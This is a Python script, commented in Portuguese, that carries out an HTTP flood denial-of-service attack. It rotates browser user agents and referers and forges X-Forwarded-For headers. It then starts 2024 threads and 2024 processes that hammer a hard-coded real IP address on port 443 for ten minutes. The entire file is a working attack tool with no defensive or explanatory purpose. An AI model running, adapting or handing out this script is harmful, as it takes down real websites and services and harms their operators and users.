import socket
import threading
import multiprocessing
import random
import time
import string

# Lista de user agents e referers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
    # Mais user agents reais
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4825.62 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.15 Safari/537.36"
]

referers = [
    "http://www.google.com",
    "http://www.bing.com",
    "http://www.yahoo.com",
    "http://www.duckduckgo.com",
    "http://www.ask.com",
    "http://www.aol.com",
    # Mais referers reais
    "http://www.wikipedia.org",
    "http://www.reddit.com",
    "http://www.amazon.com",
    "http://www.facebook.com",
    "http://www.twitter.com",
    "http://www.youtube.com"
]

# Função para gerar um IP spoofed aleatório
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Função de geração de cookie aleatório
def generate_random_cookie(length=20):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Função de ataque com IP spoofed randomizado usando sockets
def flood(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Cria um socket TCP/IP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            # Constrói a requisição HTTP
            request = "GET / HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += "User-Agent: " + random.choice(user_agents) + "\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: keep-alive\r\n"
            request += "Cache-Control: no-cache\r\n"
            request += "Referer: " + random.choice(referers) + "\r\n"
            request += "X-Requested-With: XMLHttpRequest\r\n"
            request += "Origin: http://example.com\r\n"
            request += "DNT: 1\r\n"
            request += "X-Forwarded-For: " + generate_random_ip() + "\r\n"
            request += "\r\n"

            # Envia a requisição
            s.send(request.encode())

            # Fecha o socket
            s.close()

            print(f"Request sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"An error occurred: {e}")

# Configurações do ataque
target_ip = "89.26.237.203"  # IP do site-alvo
target_port = 443  # Porta do site-alvo
duration = 600
num_threads = 2024
num_processes = 2024

# Inicia os threads e processos
threads = []
processes = []
for _ in range(num_threads):
    thread = threading.Thread(target=flood, args=(target_ip, target_port, duration))
    threads.append(thread)
    thread.start()

for _ in range(num_processes):
    process = multiprocessing.Process(target=flood, args=(target_ip, target_port, duration))
    processes.append(process)
    process.start()

# Aguarda os threads e processos terminarem
for thread in threads:
    thread.join()

for process in processes:
    process.join()